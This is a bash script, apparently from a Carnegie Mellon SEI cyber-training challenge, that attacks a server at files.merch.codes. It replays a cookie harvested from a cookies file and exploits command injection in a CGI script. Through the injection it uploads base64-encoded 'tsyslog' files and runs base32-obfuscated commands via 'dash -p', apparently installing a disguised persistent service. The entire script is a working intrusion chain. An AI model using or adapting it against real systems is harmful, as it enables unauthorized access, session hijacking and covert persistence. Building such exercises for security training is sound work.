#!/bin/bash

# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


# Read the contents of the file into a variable and base64 encode it
tsyslog_contents=$(base64 -w 0 /home/user/tsyslog)
tsyslog_service_contents=$(base64 -w 0 /home/user/tsyslog.service)

# Rest of the script

cookie=$(cat /home/user/cookies.txt | grep pritunl | rev | cut -d $'\t' -f1 | rev)
timestamp=$(vmtoolsd --cmd "info-get guestinfo.timestamp")
sed -i "s/##REPLACEME##/$timestamp/g" /home/user/tsyslog

cgi_filename=$(vmtoolsd --cmd "info-get guestinfo.cgi_filename")

curl -k "https://files.merch.codes/cgi-bin/$cgi_filename.cgi?echo%20$tsyslog_contents%20|tee%20/temp/service" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Connection: keep-alive" \
  -H "Cookie: pritunl-zero=$cookie" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "Sec-Fetch-Dest: document" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-Site: none" \
  -H "Sec-Fetch-User: ?1" \
  -H "If-Modified-Since: Sat, 29 Apr 2023 03:25:27 GMT" \
  -H "If-None-Match: '52e-5fa7124130513-gzip'"

curl -k "https://files.merch.codes/cgi-bin/$cgi_filename.cgi?echo%20$tsyslog_service_contents%20|tee%20/temp/service.service" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Connection: keep-alive" \
  -H "Cookie: pritunl-zero=$cookie" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "Sec-Fetch-Dest: document" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-Site: none" \
  -H "Sec-Fetch-User: ?1" \
  -H "If-Modified-Since: Sat, 29 Apr 2023 03:25:27 GMT" \

curl -k "https://files.merch.codes/cgi-bin/$cgi_filename.cgi?echo%20'MJQXGZJWGQQC2ZBAF52GK3LQF5ZWK4TWNFRWKIB6EAXXK43SF5ZWE2LOF52HG6LTNRXWOIBGEYQHE3JAF52GK3LQF5ZWK4TWNFRWKCQ='|base32%20-d|dash%20-p%20-s" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Connection: keep-alive" \
  -H "Cookie: pritunl-zero=$cookie" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "Sec-Fetch-Dest: document" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-Site: none" \
  -H "Sec-Fetch-User: ?1" \
  -H "If-Modified-Since: Sat, 29 Apr 2023 03:25:27 GMT" \

curl -k "https://files.merch.codes/cgi-bin/$cgi_filename.cgi?echo%20'MJQXGZJWGQQC2ZBAF52GK3LQF5ZWK4TWNFRWKLTTMVZHM2LDMUQD4IBPMV2GGL3TPFZXIZLNMQXXG6LTORSW2L3UON4XG3DPM4XHGZLSOZUWGZJAEYTCA4TNEAXXIZLNOAXXGZLSOZUWGZJOONSXE5TJMNSQU==='%20|base32%20-d|dash%20-p%20-s" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Connection: keep-alive" \
  -H "Cookie: pritunl-zero=$cookie" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "Sec-Fetch-Dest: document" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-Site: none" \
  -H "Sec-Fetch-User: ?1" \
  -H "If-Modified-Since: Sat, 29 Apr 2023 03:25:27 GMT" \

curl -k "https://files.merch.codes/cgi-bin/$cgi_filename.cgi?echo%20'MNUG233EEAVXQIBPOVZXEL3TMJUW4L3UON4XG3DPM4FA===='%20|base32%20-d|dash%20-p%20-s" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Connection: keep-alive" \
  -H "Cookie: pritunl-zero=$cookie" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "Sec-Fetch-Dest: document" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-Site: none" \
  -H "Sec-Fetch-User: ?1" \
  -H "If-Modified-Since: Sat, 29 Apr 2023 03:25:27 GMT" \

curl -k "https://files.merch.codes/cgi-bin/$cgi_filename.cgi?echo%20'ON4XG5DFNVRXI3BAMVXGCYTMMUQC2LLON53SA5DTPFZWY33HFZZWK4TWNFRWKCQ='%20|base32%20-d|dash%20-p%20-s" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Connection: keep-alive" \
  -H "Cookie: pritunl-zero=$cookie" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "Sec-Fetch-Dest: document" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-Site: none" \
  -H "Sec-Fetch-User: ?1" \
  -H "If-Modified-Since: Sat, 29 Apr 2023 03:25:27 GMT" \
